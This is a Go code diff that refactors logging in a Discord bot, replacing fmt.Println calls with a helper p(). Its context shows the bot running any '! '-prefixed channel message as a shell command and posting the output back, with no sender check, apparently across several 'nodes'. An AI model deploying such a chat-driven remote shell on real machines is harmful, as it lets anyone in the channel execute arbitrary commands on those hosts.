@@ -26,7 +26,7 @@ func main() {
 	// Setting up Bot connection
 	dg, err := discordgo.New("Bot " + token)
 	if err != nil {
-		fmt.Println(err.Error())
+		p(err.Error())
 		return
 	}
 
@@ -35,14 +35,14 @@ func main() {
 	err = dg.Open()
 
 	if err != nil {
-		fmt.Println(err.Error())
+		p(err.Error())
 		return
 	}
 
-	fmt.Println("Bot is up")
+	p("Bot is up")
 
 	// Wait here until CTRL-C or other term signal is received.
-	fmt.Println("Bot is now running. Press CTRL-C to exit.")
+	p("Bot is now running. Press CTRL-C to exit.")
 	sc := make(chan os.Signal, 1)
 	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
 	<-sc
@@ -66,19 +66,19 @@ func messageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
 	// Running command if sent to all nodes
 	if strings.HasPrefix(m.Content, "! ") {
 		command_string := m.Content[2:len(m.Content)] // get everything after the '! '
-		fmt.Println(command_string)
+		p(command_string)
 
 		out, errorMessage := runCommand(command_string)
 
 		if errorMessage != "" {
-			fmt.Println(errorMessage)
+			p(errorMessage)
 			s.ChannelMessageSend(m.ChannelID, errorMessage)
 			return
 		}
 		s.ChannelMessageSend(m.ChannelID, string(out))
 	}
 
-	fmt.Println(m.Author.Username, ": ", m.Content)
+	p(m.Author.Username, ": ", m.Content)
 
 }
 
@@ -97,7 +97,7 @@ func runCommand(command string) (outString string, errorMessage string) {
 	// run command, and if it causes an error create an error
 	out, err := exec.Command(shell, "-c", command).Output()
 	if err != nil {
-		fmt.Println(err.Error())
+		p(err.Error())
 		errorMessage = err.Error()
 
 		return
